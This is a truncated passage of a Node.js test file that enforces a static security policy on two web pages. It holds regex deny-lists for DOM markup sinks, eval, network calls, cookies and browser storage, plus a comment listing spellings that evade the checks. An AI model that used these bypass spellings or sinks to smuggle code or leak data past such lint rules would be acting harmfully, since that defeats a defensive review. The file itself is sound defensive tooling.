// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Ebayednoob
//
// Static policy for the Celestial Control Panel and the Lexicon Explorer.
// Run from the repository root: node --test "tests/static/*.test.mjs"
//
// What is checked (the lists are right below; the rules are in the functions after them):
//
//  1. Forbidden names. In the page files (the shared kit, both index.html, every script of both page folders)
//     and in the three cores, none of the names in FORBIDDEN. A rule looks at one of three views of a file:
//       "code"  program text only: comments, the contents of strings, the text of template literals and regular
//               expressions are blanked (for words that are also plain English, such as the request function);
//       "text"  everything outside comments, the contents of strings included (for names no sentence needs);
//       "all"   every character, comments included (the storage names, which are never written at all: copy
//               and comments say "browser storage").
//     An HTML file has no "code" view: it may not hold script at all (rule 2).
//     The scripts of the two page folders and the three cores also keep the rules of SCRIPT_RULES (section 1.5
//     of the specification: the DOM is built through the kit's h(), links come from the kit's LINKS, nothing
//     leaves the page): no element made outside the kit; no setAttribute but with a literal aria- or data-
//     name; no href, src, style text, class name or id assigned; no assignment to location and no navigation
//     through it; no window.open; no message listener, postMessage or message channel; no timer whose first
//     argument is not a function written in place; no worker; the clipboard only in the sky page's one copy
//     button; no host named in a string; no style property set by name, and none assigned but the width and
//     the height (of a canvas); no class name given to classList that is not a string literal, and no
//     classList (or its value) set to anything but a string literal; no Object.assign onto anything but
//     `state`, `next` or a new object; no part of a link's address (host, hostname, protocol, pathname,
//     search) assigned; no navigation.navigate; no member or item of an element's attribute map
//     (`.attributes.` or `.attributes[`). The kit is where elements are made and attributes are set, so it
//     keeps only the rules marked `kit`.
//     Optional chaining is no way round a rule: every rule reads `a?.b` as `a.b`, `f?.(x)` as `f(x)` and
//     `a?.[k]` as `a[k]`.
//     What these rules cannot see. They read how a line is spelt, not what it does when it runs, and they
//     look only for the names listed here. An assignment is read whatever its sign (`=`, `+=`, `||=`, `??=`,
//     `**=`, `>>=` and the like). Four kinds of spelling are known to get past every one of them; the list
//     is not claimed to be complete. One is a member
//     set under a computed name: `link[key] = value` and `img["src"] = value` set the same things as
//     `link.href = value`, and no rule reads them. The second is a call through another name for `window` or
//     for a function: after `const win = window`, `win.open(u)` is not seen, nor is `assign(link, x)` after
//     `const assign = Object.assign` (the same holds for any object kept under a new name: `list.value = x`
//     after `const list = el.classList`). The third is a listed member written to with no assignment sign
//     after it, as the target of a destructuring or of a loop (`[link.href] = [value]`,
//     `({ text: img.src } = entry)`, `for (link.href of list)`), and the attribute map taken whole instead of
//     by member or item (`for (const a of link.attributes) a.value = x`). The fourth is anything that stands
//     between a listed name and what its rule expects next: parentheses round the member or the object
//     (`(link.href) = value`, `(el.classList).value = x`, `(window).open(u)`), `.call` or `.apply` after a
//     listed function (`window.open.call(window, u)`), `++` or `--` in place of an assignment sign, and an
//     escape inside the name (`link.hr\u0065f = value`). An escape hides a name from every rule of this file,
//     the forbidden names of section 1 included. Besides these four, a name that no rule lists is not looked
//     for:
//     `document.title = x`, `link.download = x`, `link.port = x`, `link.hash = x`, `location.hash = x`,
//     `navigator.share(x)`, `el.attachShadow(x)`, `el.attributeStyleMap.set(name, x)` and
//     `link.setAttributeNode(x)` all pass. A change to a page script is therefore still read by a person;
//     these rules catch the careless line, not every line.
//  2. Each index.html (and any other .html in a page folder): the content policy line is the first element of
//     the head, letter for letter; no attribute whose name begins with "on"; exactly one script element, and it
//     is a module with a relative src and no text; no host anywhere in the file but the two font hosts, over
//     https; no javascript: URL.
//  3. Ids. Every $("id") literal (and getElementById("id") literal) in a script of a page folder names an id
//     that is in that page's index.html, or is given as { id: "…" } in an h(...) call of that page's scripts or
//     of the kit. An id built as a literal prefix plus something ("e-" + address) covers every literal that
//     starts with the prefix.
//  4. Links. Every value of the kit's LINKS table is a relative URL that resolves, from each page folder, to a
//     file that exists inside the repository; the table still leads to First Explorers, both pages and the
//     wing index.
//  5. The package First Explorers saves. Its "Save package" button writes the wire text, JSON.stringify(pack())
//     with no indentation, and its download() writes the text it is given: the load box of the Lexicon
//     Explorer invites that file, and the front door (readHyperpack) reads no other form. This is read in
//     first-explorers.js as text; the browser walkthrough of that page saves the file and loads it.
//  6. Self-tests: every rule above is shown to fail on a broken sample and to pass on a sound one.
//
// Files that are not written yet. A page file that does not exist is skipped, and the skip says which file.
// The skipping stops by itself: the kit and the three cores must always exist, and as soon as a page's
// index.html exists every file listed for that page must exist too. A script or page that is in a page folder
// but not in the list is checked like the listed ones. OWL_EXPLORERS_REQUIRE_ALL=1 turns every skip into a
// failure (for the last run before a release).
//
// OWL_TEST_ROOT=<dir> runs the check against another checkout.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync, statSync, existsSync } from "node:fs";
import { join, relative, resolve, dirname, isAbsolute, sep } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = process.env.OWL_TEST_ROOT || join(HERE, "..", "..");
const REQUIRE_ALL = process.env.OWL_EXPLORERS_REQUIRE_ALL === "1";

// ---------------------------------------------------------------- the lists

const WING = "Library/Experimental_Systems";
const KIT = `${WING}/explorer-kit.js`;
const CORES = ["scripts/strix-overwatch.js", "scripts/hyperbolic-moves.js", "scripts/celestial-core.js"];

// The page files. `scripts` are every module of the page folder; the ids rule reads all of them.
const PAGES = [
  {
    name: "Celestial Control Panel",
    dir: `${WING}/Celestial_Control_Panel`,
    index: "index.html",
    scripts: ["celestial-panel-model.js", "celestial-chart.js", "celestial-control-panel.js"],
  },
  {
    name: "Lexicon Explorer",
    dir: `${WING}/Lexicon_Explorer`,
    index: "index.html",
    scripts: ["lexicon-explorer-model.js", "lexicon-canvas.js", "lexicon-explorer.js", "ezekiel-1.js", "passage-as-supplied.js"],
  },
];

// What LINKS must lead to, whatever its keys are called.
const LINK_TARGETS = [
  `${WING}/First_Explorers/index.html`,
  `${WING}/Celestial_Control_Panel/index.html`,
  `${WING}/Lexicon_Explorer/index.html`,
  `${WING}/index.html`,
];

// The content policy line of both pages: the first element of the head.
const POLICY = "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
  "font-src https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'none'; worker-src 'self'; " +
  "base-uri 'none'; form-action 'none'";
const FONT_HOSTS = ["fonts.googleapis.com", "fonts.gstatic.com"];

// The forbidden names. `sample` is a line that breaks the rule; the self-test proves each one is caught.
// An identifier: the name with no letter, digit, _ or $ on either side.
const ident = (name) => new RegExp(`(?<![\\w$])${name}(?![\\w$])`);
const STORE = "Storage";   // the two storage names are put together here so that this file does not write them
const FORBIDDEN = [
  // markup sinks
  { name: "innerHTML", where: "text", re: /\binnerHTML\b/, sample: "el.innerHTML = s;" },
  { name: "outerHTML", where: "text", re: /\bouterHTML\b/, sample: "el.outerHTML = s;" },
  { name: "insertAdjacentHTML", where: "text", re: /\binsertAdjacentHTML\b/, sample: 'el.insertAdjacentHTML("beforeend", s);' },
  { name: "document.write", where: "text", re: /\bdocument\s*\.\s*write(?:ln)?\b/, sample: "document.write(s);" },
  { name: "srcdoc", where: "text", re: /srcdoc/i, sample: "frame.srcdoc = s;" },
  { name: "DOMParser", where: "text", re: /\bDOMParser\b/, sample: "const d = new DOMParser();" },
  { name: "createContextualFragment", where: "text", re: /\bcreateContextualFragment\b/, sample: "range.createContextualFragment(s);" },
  { name: "setHTMLUnsafe", where: "text", re: /\bsetHTMLUnsafe\b/, sample: "box.setHTMLUnsafe(s);" },
  { name: "parseHTMLUnsafe", where: "text", re: /\bparseHTMLUnsafe\b/, sample: "const d = Document.parseHTMLUnsafe(s);" },
  { name: "setHTML", where: "text", re: /\.\s*setHTML\s*\(/, sample: "box.setHTML(s);" },
  // code from text
  { name: "eval", where: "code", re: ident("eval"), sample: "const v = eval(s);" },
  { name: "new Function", where: "code", re: /\bnew\s+Function\b|(?<![\w$])Function\s*\(/, sample: 'const f = new Function("a", s);' },
  { name: "dynamic import(", where: "code", re: /(?<![\w$.])import\s*\(/, sample: 'const m = await import("./x.js");' },
  // the network
  { name: "fetch", where: "code", re: ident("fetch"), sample: "const r = await fetch(u);" },
  { name: "XMLHttpRequest", where: "text", re: /\bXMLHttpRequest\b/, sample: "const x = new XMLHttpRequest();" },
  { name: "WebSocket", where: "text", re: /\bWebSocket\b/, sample: "const w = new WebSocket(u);" },
  { name: "EventSource", where: "text", re: /\bEventSource\b/, sample: "const e = new EventSource(u);" },
  { name: "sendBeacon", where: "text", re: /\bsendBeacon\b/, sample: "navigator.sendBeacon(u, s);" },
  // the device and what it keeps
  { name: "geolocation", where: "text", re: /geolocation/i, sample: "navigator.geolocation.getCurrentPosition(f);" },
  { name: "cookie", where: "code", re: ident("cookie"), sample: 'document.cookie = "a=1";' },
  { name: "cookieStore", where: "text", re: /\bcookieStore\b/, sample: 'await cookieStore.set("a", "1");' },
  { name: "IndexedDB", where: "all", re: /[Ii]ndexed[Dd][Bb]|\bIDB[A-Z][A-Za-z]+\b/, sample: 'const q = indexedDB.open("x");' },
  { name: "browser storage (the local one)", where: "all", re: new RegExp(`\\blocal${STORE}\\b`), sample: `local${STORE}.setItem("a", "1");` },
  { name: "browser storage (the session one)", where: "all", re: new RegExp(`\\bsession${STORE}\\b`), sample: `session${STORE}.setItem("a", "1");` },
  { name: "navigator.storage", where: "text", re: /\bnavigator\s*\.\s*storage\b/, sample: "await navigator.storage.persist();" },
  { name: "openDatabase", where: "text", re: /\bopenDatabase\b/, sample: 'const db = openDatabase("x", "1", "x", 1);' },
  { name: "the Cache API", where: "code", re: /(?<![\w$])caches\s*\.\s*(?:open|match)\s*\(/, sample: 'const c = await caches.open("x");' },
  // names no function may carry (tests/static/sinks.test.mjs trusts some of them as escapers)
  { name: "a function named esc", where: "code", re: ident("esc"), sample: "function esc(s) { return s; }" },
  { name: "a function named escapeHtml", where: "code", re: ident("escapeHtml"), sample: "const escapeHtml = (s) => s;" },
  { name: "a function named escapeAttr", where: "code", re: ident("escapeAttr"), sample: "const escapeAttr = (s) => s;" },
  { name: "a function named escHtml", where: "code", re: ident("escHtml"), sample: "const escHtml = (s) => s;" },
  { name: "a function named escAttr", where: "code", re: ident("escAttr"), sample: "const escAttr = (s) => s;" },
  { name: "a function named escapeHTML", where: "code", re: ident("escapeHTML"), sample: "const escapeHTML = (s) => s;" },
  { name: "a function named jsArg", where: "code", re: ident("jsArg"), sample: "const jsArg = (s) => s;" },
];

// The page-script rules. They are read on the scripts of the two page folders and on the three cores, and those
// marked `kit` on the kit as well. `start: true` means a match must begin in program text; the expression may
// then read on into a string (the name of an attribute, the first argument of a timer). `allow` names a file
// and how many matches it may hold. `sound` are lines next to the rule that must not be caught.
const SKY_SHELL = `${WING}/Celestial_Control_Panel/celestial-control-panel.js`;
const assigned = "(?:=(?![=>])|(?:\\*\\*|<<|>>>?|&&|\\|\\||\\?\\?|[-+*/%&|^])=)";   // an assignment (=, +=, ||=, ??=, **=, >>= …), not ==, === or =>
const quoted = "(?:\"[\\w -]*\"|'[\\w -]*')";       // a class name, or several, written as a string literal
const SCRIPT_RULES = [
  { name: "an element made outside the kit", where: "code",
    re: /(?<![\w$])createElement(?:NS)?(?![\w$])|(?<![\w$])new\s+(?:Image|Audio|Option)(?![\w$])/,
    sample: 'const a = document.createElement("a");',
    sound: ['const p = h("p", { class: "note" }, "made by the kit");', "const image = newImage(), created = createElements(2);"] },
  { name: "setAttribute with a name that is not an aria- or data- literal", where: "text", start: true,
    re: /\.\s*setAttribute(?:NS)?\s*\((?!\s*(["'])(?:aria|data)-[a-z0-9-]+\1\s*,)/,
    sample: 'a.setAttribute("href", u);',
    sound: ['b.setAttribute("aria-pressed", String(on)); $("say").setAttribute("data-station", key);', "b.setAttribute('aria-label', label); b.removeAttribute(\"aria-disabled\"); const v = b.getAttribute(\"data-view\");"] },
  { name: "href, src or action assigned outside the kit", where: "code",
    re: new RegExp(`\\.\\s*(?:href|src|srcset|action|formAction)\\s*${assigned}`),
    sample: "a.href = u;",
    sound: ['const link = h("a", { href: x.href }, x.name); if (x.href === y.href || a.src == b.src) go();', "const url = location.href.split(\"#\")[0] + href.slice(1); const f = (x) => x.href => 1;"] },
  { name: "style text, a class name or an id assigned outside the kit", where: "code",
    re: new RegExp(`\\.\\s*(?:cssText|className|id|style)\\s*${assigned}`),
    sample: "a.className = s;",
    sound: ['canvas.style.width = w.toFixed(0) + "px"; box.classList.toggle("many", n > 4); box.hidden = !show;', "if (row.id === id || el.className == name) return { id: row.id, style: 1 };"] },
  { name: "location assigned or navigated", where: "code", kit: true,
    re: new RegExp(`(?:(?<![\\w$.])|(?<![\\w$])(?:window|document|self|top|parent|globalThis)\\s*\\.\\s*)location\\s*(?:${assigned}|\\.\\s*(?:assign|replace|reload)\\s*\\(|\\.\\s*(?:href|pathname|search|host|hostname|port|protocol|origin)\\s*${assigned})`),
    sample: "location.assign(u);",
    sound: ['const a = location.hash, b = location.href.split("#")[0]; if (location.hash === a) history.replaceState(null, "", a);', 'history.pushState(null, "", next); const s = text.replace(/a/g, "b"), r = Object.assign({}, a); place.location = "here";'] },
  { name: "window.open", where: "code",
    re: /(?<![\w$])(?:window|self|top|parent|globalThis)\s*\.\s*open\s*\(|(?<![\w$.])open\s*\(/,
    sample: "window.open(u);",
    sound: ["dialogs.about.open(button); details.open = true; const opened = reopen(1);"] },
  { name: "a message listener", where: "text", start: true, kit: true,
    re: /(?<![\w$])addEventListener\s*\(\s*(["'`])message\1|(?<![\w$])onmessage(?![\w$])/,
    sample: 'addEventListener("message", f);',
    sound: ['window.addEventListener("hashchange", f); el.addEventListener("click", f); const message = "a message";'] },
  { name: "postMessage or a message channel", where: "code", kit: true,
    re: /(?<![\w$])postMessage(?![\w$])|(?<![\w$])(?:BroadcastChannel|MessageChannel)(?![\w$])/,
    sample: 'parent.postMessage(s, "*");',
    sound: ["const posted = postMessages(1);"] },
  { name: "a timer whose first argument is not a function written in place", where: "text", start: true,
    re: /(?<![\w$])set(?:Timeout|Interval)\s*\((?!\s*(?:async\s+)?(?:function(?![\w$])|\([^()]*\)\s*=>|[A-Za-z_$][\w$]*\s*=>))/,
    sample: 'setTimeout("go()", 0);',
    sound: ["const t = setTimeout(() => go(), 100), u = setInterval(function () { go(); }, 1000), v = setTimeout(async (x) => go(x), 0); clearTimeout(t);", "window.setTimeout(x => go(x), 5); requestAnimationFrame(step);"] },
  { name: "a worker", where: "code", kit: true,
    re: /(?<![\w$])new\s+(?:Shared)?Worker(?![\w$])|(?<![\w$])(?:serviceWorker|importScripts)(?![\w$])/,
    sample: "const w = new Worker(u);",
    sound: ["const worker = newWorker(), Workers = 2;"] },
  { name: "the clipboard read, or written with anything but writeText", where: "code", kit: true,
    re: /(?<![\w$])clipboard\s*\.\s*(?:read|readText|write)\s*\(|(?<![\w$])execCommand(?![\w$])/,
    sample: "const t = await navigator.clipboard.readText();",
    sound: ["const clipboards = 1;"] },
  { name: "the clipboard outside the sky page's one copy button", where: "code", kit: true, allow: { [SKY_SHELL]: 1 },
    re: /(?<![\w$])clipboard(?![\w$])(?!\s*\.\s*(?:read|readText|write)\s*\()/,
    sample: "navigator.clipboard.writeText(s);",
    sound: ["const clipboards = 1;"] },
  { name: "a host named in a script", where: "text", kit: true,
    re: /[A-Za-z][A-Za-z0-9+.-]*:\/\/[^\s"'`<>()\\;,]*|(?<=["'`])\/\/[A-Za-z0-9-]+\.[A-Za-z0-9.-]*/,
    sample: 'const u = "https://example.org/x";',
    sound: ['const link = "../First_Explorers/index.html#lens=navigator", blob = "blob:", data = "data:,", r = /^https?:\\/\\//, half = n / 2 // 3;'] },
  { name: "a style property set by name outside the kit", where: "code",
    re: /\.\s*setProperty\s*\(/,
    sample: 'el.style.setProperty("background", s);',
    sound: ['const gold = getComputedStyle(el).getPropertyValue("--gold"); el.style.removeProperty("width"); const setProperty = 1, property = setProperties(el);'] },
  { name: "a style property other than width and height assigned outside the kit", where: "code",
    re: new RegExp(`\\.\\s*style\\s*\\.\\s*(?!(?:width|height|cssText)(?![\\w$]))[A-Za-z_$][\\w$]*\\s*${assigned}`),
    sample: 'el.style.backgroundImage = "url(" + s + ")";',
    sound: ['canvas.style.width = w.toFixed(0) + "px"; canvas.style.height = h.toFixed(0) + "px";', 'if (el.style.display === "none" || a.style.color == b.style.color) show(el.style.widths, row.styles.color = 1);'] },
  { name: "a class name given to classList that is not a string literal", where: "text", start: true, kit: true,
    re: new RegExp(`(?<![\\w$])classList\\s*\\.\\s*(?:add\\s*\\((?!\\s*${quoted}(?:\\s*,\\s*${quoted})*\\s*\\))|toggle\\s*\\((?!\\s*${quoted}\\s*[,)])|replace\\s*\\((?!\\s*${quoted}\\s*,\\s*${quoted}\\s*\\)))`),
    sample: "el.classList.add(kind);",
    sound: ['box.classList.toggle("many", n > 4); el.classList.add("seg", \'lens-switch\'); el.classList.replace("open", "shut"); el.classList.toggle("open");', 'el.classList.remove(old); if (el.classList.contains(name)) go(); const classLists = lists.add(name);'] },
  { name: "Object.assign onto something other than state, next or a new object", where: "code", kit: true,
    re: /(?<![\w$])Object\s*\.\s*assign\s*\((?!\s*(?:(?:state|next)\s*,|\{))/,
    sample: "Object.assign(link, { href: u });",
    sound: ["Object.assign(state, M.setLens(state, id)); Object.assign(next, { view: 1 }); const copy = Object.assign({}, a), other = Object.assign( { a: 1 }, b);", "const made = myObject.assigned(link), entries = Object.entries(link);"] },
  { name: "a part of a link's address assigned outside the kit", where: "code",
    re: new RegExp(`\\.\\s*(?:host|hostname|protocol|pathname|search)\\s*${assigned}`),
    sample: "link.host = s;",
    sound: ['const r = { host: box, search: "" }; if (hasFocus(r.host) || a.hostname === b.hostname || u.protocol == "blob:") go(u.pathname, u.search);', "const at = text.search(/a/), hosts = r.hosts = 2, f = (u) => u.host;"] },
  { name: "navigation.navigate", where: "code", kit: true,
    re: /(?<![\w$])navigation\s*\.\s*navigate\s*\(/,
    sample: "navigation.navigate(u);",
    sound: ["const navigation = rows.map(navigate), navigations = 1; nav.navigate(2); navigate(3);"] },
  // classList = x sets the same class attribute as classList.value = x. An assignment to className is not in this rule: outside the
  // kit the rule "style text, a class name or an id assigned" refuses it whatever stands on the right, and inside the kit h() sets
  // className from its "class" attribute, which is how every class name of the pages is set.
  { name: "classList or its value set to anything but a string literal", where: "text", start: true, kit: true,
    re: new RegExp(`(?:(?<![\\w$])classList\\s*\\.\\s*value|\\.\\s*classList)\\s*${assigned}(?!\\s*${quoted}\\s*[;,)}\\]])`),
    sample: "el.classList.value = kind;",
    sound: ['el.classList.value = "row open"; box.classList = \'row\'; const v = el.classList.value, list = el.classList; if (el.classList.value === name) go();',
      "const classList = spec.classList, values = { value: kind }; row.classLists = names; field.value = kind;"] },
  { name: "a member or an item of an element's attribute map", where: "code", kit: true,
    re: /\.\s*attributes\s*[.[]/,
    sample: "link.attributes.href.value = u;",
    sound: ['const attributes = rows.map(attr), n = attributes.length, first = attributes[0]; if (el.hasAttributes()) go(el.getAttribute("data-x"), spec.attributesOf(el));'] },
];
const isScript = (rel) => /\.(?:m?js|cjs)$/i.test(rel);
// The rules a file keeps: FORBIDDEN everywhere; SCRIPT_RULES in a script of a page folder and in a core; in the
// kit, the SCRIPT_RULES marked `kit`.
function rulesFor(rel) {
  if (!isScript(rel)) return FORBIDDEN;
  if (rel === KIT) return [...FORBIDDEN, ...SCRIPT_RULES.filter((r) => r.kit)];
  return pageOf(rel) || CORES.includes(rel) ? [...FORBIDDEN, ...SCRIPT_RULES] : FORBIDDEN;
}

// ---------------------------------------------------------------- files

const abs = (rel) => join(ROOT, ...rel.split("/"));
const present = (rel) => existsSync(abs(rel));
const read = (rel) => readFileSync(abs(rel), "utf8");
const posix = (p) => p.split(sep).join("/");
const lineOf = (src, index) => src.slice(0, index).split("\n").length;

const pageOf = (rel) => PAGES.find((p) => rel.startsWith(p.dir + "/")) || null;
const listedOf = (page) => [page.index, ...page.scripts].map((f) => `${page.dir}/${f}`);

// Only a listed page file may be missing, and only until its page's index.html exists (or the run asks for all).
// Everything else (the kit, a core, a target of LINKS outside the two pages) must exist.
function required(rel, exists = present) {
  const page = pageOf(rel);
  if (REQUIRE_ALL || !page || !listedOf(page).includes(rel)) return true;
  return exists(`${page.dir}/${page.index}`);
}
// "present", "pending" (not written yet: skip) or "missing" (must exist: fail).
function stateOf(rel, exists = present) {
  return exists(rel) ? "present" : required(rel, exists) ? "missing" : "pending";
}
function pendingNote(rel) {
  const page = pageOf(rel), index = page ? `${page.dir}/${page.index}` : "";
  return `not written yet: ${rel} (checked as soon as it exists` + (rel === index ? ")" : `; it must exist once ${index} does)`);
}
function missingNote(rel) {
  const page = pageOf(rel);
  return `${rel} does not exist` + (page && !REQUIRE_ALL ? `, but ${page.dir}/${page.index} does: the page is not whole` : "");
}

// Scripts and pages found in a page folder (any depth), as repository paths.
function foundIn(dirRel) {
  const out = [];
  if (!present(dirRel)) return out;
  (function walk(dir) {
    for (const name of readdirSync(dir).sort()) {
      const p = join(dir, name);
      if (statSync(p).isDirectory()) walk(p);
      else if (/\.(m?js|cjs|html?)$/i.test(name)) out.push(posix(relative(ROOT, p)));
    }
  })(abs(dirRel));
  return out;
}
const unlisted = (listed, found) => found.filter((f) => !listed.includes(f));

// ---------------------------------------------------------------- views of a script

const CODE = 0, COMMENT = 1, STRING = 2;
const REGEX_AFTER_CHAR = "(,=:[!&|?{};+-*%<>~^";
const REGEX_AFTER_WORD = new Set(["return", "typeof", "case", "in", "of", "do", "else", "void", "delete", "throw", "new", "instanceof", "yield", "await"]);
// True when the token before a "/" ends a value, so that the "/" divides: a name, a number, a string, ) or ].
const endsValue = (prev) => prev === "0" || prev === '"' || prev === "`" || prev === "re" || prev === ")" || prev === "]" || (/^[\w$]/.test(prev) && !REGEX_AFTER_WORD.has(prev));

// One kind per character: CODE, COMMENT or STRING (a quoted string, the text of a template literal, a regular
// expression; the code inside ${...} of a template is CODE again).
function kindsOfJs(src) {
  const n = src.length, kind = new Uint8Array(n), braces = [];
  let i = 0, prev = "";
  const mark = (from, to, k) => kind.fill(k, from, Math.min(n, to));
  // src[from] opens a run of template text: the backtick, or the } that ends a ${...}. Returns where code goes on.
  function templateText(from) {
    let j = from + 1;
    while (j < n) {
      const c = src[j];
      if (c === "\\") { j += 2; continue; }
      if (c === "`") { mark(from, j + 1, STRING); prev = "`"; return j + 1; }
      if (c === "$" && src[j + 1] === "{") { mark(from, j + 2, STRING); braces.push(0); prev = "{"; return j + 2; }
      j++;
    }
    mark(from, n, STRING);
    return n;
  }
  while (i < n) {
    const c = src[i], d = src[i + 1];
    if (c === "/" && d === "/") { let j = src.indexOf("\n", i); if (j < 0) j = n; mark(i, j, COMMENT); i = j; continue; }
    if (c === "/" && d === "*") { let j = src.indexOf("*/", i + 2); j = j < 0 ? n : j + 2; mark(i, j, COMMENT); i = j; continue; }
    if (c === '"' || c === "'") {
      let j = i + 1;
      while (j < n && src[j] !== c && src[j] !== "\n") j += src[j] === "\\" ? 2 : 1;
      mark(i, j + 1, STRING);
      i = Math.min(n, j + 1);
      prev = '"';
      continue;
    }
    if (c === "`") { i = templateText(i); continue; }
    if (c === "{") { if (braces.length) braces[braces.length - 1]++; prev = c; i++; continue; }
    if (c === "}") {
      if (braces.length) {
        if (braces[braces.length - 1] === 0) { braces.pop(); i = templateText(i); continue; }
        braces[braces.length - 1]--;
      }
      prev = c;
      i++;
      continue;
    }
    if ((c === "+" || c === "-") && d === c) { prev = endsValue(prev) ? ")" : c; i += 2; continue; }   // n++ / 2 divides
    if (c === "/" && (prev === "" || REGEX_AFTER_CHAR.includes(prev) || REGEX_AFTER_WORD.has(prev))) {
      let j = i + 1, inClass = false;
      while (j < n && src[j] !== "\n") {
        if (src[j] === "\\") { j += 2; continue; }
        if (src[j] === "[") inClass = true;
        else if (src[j] === "]") inClass = false;
        else if (src[j] === "/" && !inClass) break;
        j++;
      }
      if (src[j] === "/") {
        j++;
        while (j < n && /[A-Za-z]/.test(src[j])) j++;
        mark(i, j, STRING);
        i = j;
        prev = "re";
        continue;
      }
    }
    if (/[A-Za-z_$]/.test(c)) { let j = i + 1; while (j < n && /[\w$]/.test(src[j])) j++; prev = src.slice(i, j); i = j; continue; }
    if (/[0-9]/.test(c)) { let j = i + 1; while (j < n && /[\w.]/.test(src[j])) j++; prev = "0"; i = j; continue; }
    if (!/\s/.test(c)) prev = c;
    i++;
  }
  return kind;
}
// Blanks every character whose kind is in `drop`; line breaks stay, so offsets and line numbers still hold.
function blank(src, kind, drop) {
  let out = "";
  for (let i = 0; i < src.length; i++) out += drop.includes(kind[i]) && src[i] !== "\n" ? " " : src[i];
  return out;
}
function viewsOfJs(src) {
  const kind = kindsOfJs(src);
  return { kind, all: src, text: blank(src, kind, [COMMENT]), code: blank(src, kind, [COMMENT, STRING]) };
}

// ---------------------------------------------------------------- reading a page

// Start tags with their attributes, comments, and the text of script and style elements.
function parseHtml(src) {
  const tags = [], comments = [];
  const n = src.length;
  let i = 0;
  while (i < n) {
    const lt = src.indexOf("<", i);
    if (lt < 0) break;
    if (src.startsWith("<!--", lt)) {
      const end = src.indexOf("-->", lt + 4);
      const stop = end < 0 ? n : end + 3;
      comments.push([lt, stop]);
      i = stop;
      continue;
    }
    const open = /^<([A-Za-z][^\s/>]*)/.exec(src.slice(lt, lt + 64));
    if (!open) { i = lt + 1; continue; }
    const tag = { name: open[1].toLowerCase(), attrs: [], index: lt, body: null };
    let j = lt + open[0].length;
    while (j < n && src[j] !== ">") {
      if (/[\s/]/.test(src[j])) { j++; continue; }
      const nameStart = j;
      while (j < n && !/[\s/>=]/.test(src[j])) j++;
      if (j === nameStart) { j++; continue; }   // a stray "="
      const name = src.slice(nameStart, j).toLowerCase();
      let k = j, value = null;
      while (k < n && /\s/.test(src[k])) k++;
      if (src[k] === "=") {
        k++;
        while (k < n && /\s/.test(src[k])) k++;
        if (src[k] === '"' || src[k] === "'") {
          const close = src.indexOf(src[k], k + 1);
          const stop = close < 0 ? n : close;
          value = src.slice(k + 1, stop);
          j = Math.min(n, stop + 1);
        } else {
          const from = k;
          while (k < n && !/[\s>]/.test(src[k])) k++;
          value = src.slice(from, k);
          j = k;
        }
      }
      tag.attrs.push([name, value]);
    }
    i = Math.min(n, j + 1);
    if (tag.name === "script" || tag.name === "style") {
      const close = src.slice(i).search(new RegExp(`</${tag.name}\\b`, "i"));
      const stop = close < 0 ? n : i + close;
      tag.body = src.slice(i, stop);
      i = stop;
    }
    tags.push(tag);
  }
  return { tags, comments };
}
const attr = (tag, name) => { const a = tag.attrs.find(([k]) => k === name); return a ? (a[1] === null ? "" : a[1]) : null; };

function viewsOfHtml(src) {
  let text = src;
  for (const [from, to] of parseHtml(src).comments) text = text.slice(0, from) + text.slice(from, to).replace(/[^\n]/g, " ") + text.slice(to);
  return { all: src, text, code: null };
}

// ---------------------------------------------------------------- rule 1: forbidden names

// Optional chaining spells the same member or the same call another way, so the rules read a?.b as a.b, f?.(x) as f(x) and
// a?.[k] as a[k]: the two characters are written over in place (offsets and line numbers still hold). "?." before a digit is
// the question mark of a choice and a number (on ?.5 : 1), and stays.
const plainChain = (view) => view.replace(/\?\.(?!\d)(\s*[([])?/g, (m, open) => (open ? "  " + open : " ."));

function forbiddenIn(path, src, rules = rulesFor(path)) {
  const html = /\.html?$/i.test(path), views = html ? viewsOfHtml(src) : viewsOfJs(src);
  if (!html) { views.text = plainChain(views.text); views.code = plainChain(views.code); }
  const out = [];
  for (const rule of rules) {
    const view = views[rule.where];
    if (view == null) continue;
    const re = new RegExp(rule.re.source, rule.re.flags.includes("g") ? rule.re.flags : rule.re.flags + "g");
    let allowed = (rule.allow && rule.allow[path]) || 0;
    for (const m of view.matchAll(re)) {
      if (rule.start && views.kind[m.index] !== CODE) continue;   // the words in a string or in template text
      if (allowed-- > 0) continue;
      out.push(`${path}:${lineOf(src, m.index)}: ${rule.name} (found "${m[0].trim()}")`);
    }
  }
  return out;
}

// ---------------------------------------------------------------- rule 2: the page file

function policyProblems(path, src) {
  const { tags } = parseHtml(src);
  const head = tags.findIndex((t) => t.name === "head");
  if (head < 0) return [`${path}: no head element`];
  const first = tags[head + 1];
  if (!first || first.name !== "meta" || (attr(first, "http-equiv") || "").toLowerCase() !== "content-security-policy") {
    return [`${path}:${first ? lineOf(src, first.index) : 1}: the first element of the head must be the Content-Security-Policy meta element`];
  }
  if (attr(first, "content") !== POLICY) {
    return [`${path}:${lineOf(src, first.index)}: the content policy differs from the one line both pages carry:\n  have: ${attr(first, "content")}\n  want: ${POLICY}`];
  }
  return [];
}

function handlerProblems(path, src) {
  const out = [];
  for (const tag of parseHtml(src).tags) {
    for (const [name] of tag.attrs) {
      if (name.startsWith("on")) out.push(`${path}:${lineOf(src, tag.index)}: attribute ${name} on a ${tag.name} element (attach listeners in the module)`);
    }
  }
  return out;
}

const isRelativeUrl = (v) => typeof v === "string" && v.trim() !== "" && !/^[A-Za-z][A-Za-z0-9+.-]*:/.test(v.trim()) && !/^[\\/]/.test(v.trim()) && !/[\s\\]/.test(v.trim());

function scriptProblems(path, src) {
  const scripts = parseHtml(src).tags.filter((t) => t.name === "script");
  const out = [];
  if (scripts.length !== 1) out.push(`${path}: ${scripts.length} script elements; a page has exactly one, a module with a relative src`);
  for (const s of scripts) {
    const where = `${path}:${lineOf(src, s.index)}`;
    if ((attr(s, "type") || "").trim().toLowerCase() !== "module") out.push(`${where}: the script is not type="module"`);
    if (!isRelativeUrl(attr(s, "src"))) out.push(`${where}: the script's src is missing or not a relative URL`);
    if ((s.body || "").trim() !== "") out.push(`${where}: inline script`);
  }
  return out;
}

function hostProblems(path, src) {
  const out = [];
  for (const m of src.matchAll(/([A-Za-z][A-Za-z0-9+.-]*):\/\/([^\s/"'<>()\;,?#]*)/g)) {
